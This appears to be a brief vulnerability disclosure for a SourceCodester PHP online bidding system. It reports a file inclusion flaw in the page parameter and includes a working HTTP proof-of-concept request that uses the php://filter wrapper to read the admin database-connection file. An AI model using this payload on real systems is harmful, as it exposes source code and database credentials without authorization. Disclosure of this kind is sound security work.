## Sourcecoster simple online bidding system has Unauthorized access

## submitter
zhangMingMing

## supplier
https://www.sourcecodester.com/php/14558/simple-online-bidding-system-using-phpmysqli-source-code.html

## Vulnerability file
/simple-online-bidding-system/bidding/index.php?page=xxx

## Vulnerability analysis
<img width="1168" alt="image" src="https://github.com/user-attachments/assets/35d4aff4-2a1e-48cf-bbc0-1138579bc989">

## describe
A simple online bidding system has an unrestricted file inclusion vulnerability. An attacker can use this vulnerability to cooperate with pseudo-protocols to directly gain access to the target system.
POC
```
GET /simple-online-bidding-system/bidding/index.php?page=php://filter/read=convert.base64-encode/resource=./admin/db_connect HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```

<img width="1549" alt="image" src="https://github.com/user-attachments/assets/ab8ab1f1-e395-4a32-a405-07ef76d632d8">

Obtain the target source code after base64 decryption。

<img width="1218" alt="image" src="https://github.com/user-attachments/assets/0a4e366b-cb5b-4ff6-bcae-b620748b312f">








